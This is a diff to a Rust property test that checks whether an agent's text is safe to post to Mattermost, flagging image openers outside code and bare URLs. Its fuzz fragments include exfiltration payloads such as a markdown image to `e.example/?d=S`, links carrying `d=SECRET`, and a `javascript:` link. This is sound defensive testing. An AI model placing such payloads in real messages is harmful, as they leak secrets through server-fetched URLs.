@@ -88,6 +88,26 @@ fn posts_with(raw: &str, lk: &Lookups) -> Vec<(String, usize)> {
 /// The first reason `post` is not safe, if any: an image (or an image opener) outside code, a
 /// link that is not http/https/mailto.
 fn violation(post: &str) -> Option<String> {
+    // An image opener anywhere outside code, even where the parser shows nothing (the cells of a
+    // table row beyond the header are dropped by GFM but rendered by Mattermost 11.7.15).
+    {
+        let code: Vec<std::ops::Range<usize>> = Parser::new_ext(post, opts())
+            .into_offset_iter()
+            .filter(|(e, _)| matches!(e, Event::Code(_) | Event::Start(Tag::CodeBlock(_))))
+            .map(|(_, r)| r)
+            .collect();
+        // (`\![x](u)`: an escaped `!` in front of an ordinary link)
+        if post.match_indices("![").any(|(i, _)| {
+            !code.iter().any(|r| r.contains(&i))
+                && post[..i].chars().rev().take_while(|c| *c == '\\').count() % 2 == 0
+        }) {
+            return Some("an image opener outside code".to_owned());
+        }
+    }
+    // (D-270: an agent's text reaches Mattermost with no bare URL left.)
+    if aurora_connector_mattermost::convert::has_bare_url(post) {
+        return Some("a bare URL is left (the server would fetch it)".to_owned());
+    }
     if !aurora_connector_mattermost::convert::is_safe(post) {
         return Some(
             "fails the last-line check (a link that lies about its host, or a bad link)".to_owned(),
@@ -246,6 +266,9 @@ fn fragments() -> impl Strategy<Value = String> {
         "<@here>",
         "<@user:U1>",
         "[https://cern.ch](http:e.example/l)",
+        "|a|b|\n|-|-|\n|1|2|![x](https://e.example/?d=S)|",
+        "|a|b|\n|-|-|\n|1|2|https://e.example/?d=S @channel [x](javascript:alert(1))|",
+        "a | b\n--|--\n1 | 2 | ![x](u) | @all",
         "see https://e.example/?d=SECRET now",
         "<https://e.example/?d=SECRET>",
         "- https://e.example/1\n- <https://e.example/2>",
